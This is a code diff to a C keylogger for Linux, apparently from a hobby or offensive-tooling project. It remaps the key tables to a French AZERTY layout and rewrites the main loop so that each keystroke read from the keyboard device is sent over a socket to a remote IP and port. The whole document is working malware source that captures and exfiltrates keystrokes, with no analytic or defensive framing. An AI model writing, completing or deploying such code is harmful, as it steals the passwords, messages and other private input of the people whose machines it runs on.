@@ -8,20 +8,21 @@
 #include <signal.h>
 
 #include "keylogger.h"
+#include "network.h"
 
 #define UK "[UNKNOW]"
 #define SHIFT(key) ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))
 #define ALTGR(key) (key == KEY_RIGHTALT)
 
 static const char *keycodes[] =
-    {"[RESERVED]", "[ESC]", "&", "é", "\"", "'", "(", "-", "è", "_", "ç", "à",
+    {"[RESERVED]", "[ESC]", "&", "é", "\"", "ù", "(", "-", "è", "_", "ç", "à",
      ")", "=", "[BACKSPACE]", "[TAB]", "a", "z", "e", "r", "t", "y", "u", "i",
-     "o", "p", "[", "]", "[ENTER]", "[L_CTRL]", "q", "s", "d", "f", "g", "h",
-     "j", "k", "l", "m", "'", "`", "L_SHIFT", "\\", "w", "x", "c", "v", "b",
+     "o", "p", "^", "$", "[ENTER]", "[L_CTRL]", "q", "s", "d", "f", "g", "h",
+     "j", "k", "l", "m", "'", "²", "L_SHIFT", "*", "w", "x", "c", "v", "b",
      "n", ",", ";", ":", "!", "[R_SHIFT]", "*", "[L_ALT]", "[SPACE] ", "[CAPS_LOCK]",
      "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "[NUM_LOCK]",
      "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
-     "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
+     "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, "<",
      "F11", "F12", UK, UK, UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/",
      "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
      "DOWN", "PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK, UK, UK, UK,
@@ -30,12 +31,12 @@ static const char *keycodes[] =
 static const char *shifted_keycodes[] =
     {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
      "°", "+", "BACKSPACE", "TAB", "A", "Z", "E", "R", "T", "Y", "U", "I",
-     "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H",
-     "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B",
-     "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
+     "O", "P", "¨", "£", "ENTER", "L_CTRL", "Q", "S", "D", "F", "G", "H",
+     "J", "K", "L", "M", "%", "~", "L_SHIFT", "µ", "W", "X", "C", "V", "B",
+     "N", "?", ".", "/", "§", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
      "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
      "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5",
-     "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK,
+     "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, ">",
      "F11", "F12", UK, UK, UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/",
      "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
      "DOWN", "PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK, UK, UK, UK,
@@ -67,28 +68,42 @@ void keylogger_exit(void)
     close(keyboard_fd);
 }
 
-const char *keylogger_event()
+const void keylogger()
 {
-    int shift_flag, altgr_flag = 0;
+    int sock = init_connection();
+    struct sockaddr_in serv;
+    char client_message[BUF_SIZE];
+
+    memset(client_message, '\0', sizeof(client_message));
+
+    serv.sin_family = AF_INET;
+    serv.sin_port = htons(PORT);
+    serv.sin_addr.s_addr = inet_addr(IP);
+
+    int shift_flag = 0;
+    int altgr_flag = 0;
     struct input_event event;
 
-    while (running) {
+    while (running)
+    {
         read(keyboard_fd, &event, sizeof(event));
 
         /* If a key from the keyboard is pressed */
-        if (event.type == EV_KEY && event.value == 1) {
+        if (event.type == EV_KEY && event.value == 1)
+        {
             if (SHIFT(event.code))
                 shift_flag = event.code;
-            if(ALTGR(event.code))
+            if (ALTGR(event.code))
                 altgr_flag = event.code;
 
-            if (shift_flag && !altgr_flag &&!SHIFT(event.code))
-                return shifted_keycodes[event.code];
-            
+            if (shift_flag && !altgr_flag && !SHIFT(event.code))
+                send_message(sock, serv, shifted_keycodes[event.code]);
+
             else if (!shift_flag && !altgr_flag && !SHIFT(event.code))
-                return keycodes[event.code];
+                send_message(sock, serv, keycodes[event.code]);
         }
-        else {
+        else
+        {
             /* If a key from the keyboard is released */
             if (event.type == EV_KEY && event.value == 0)
             {
@@ -99,5 +114,4 @@ const char *keylogger_event()
             }
         }
     }
-    return "";
 }
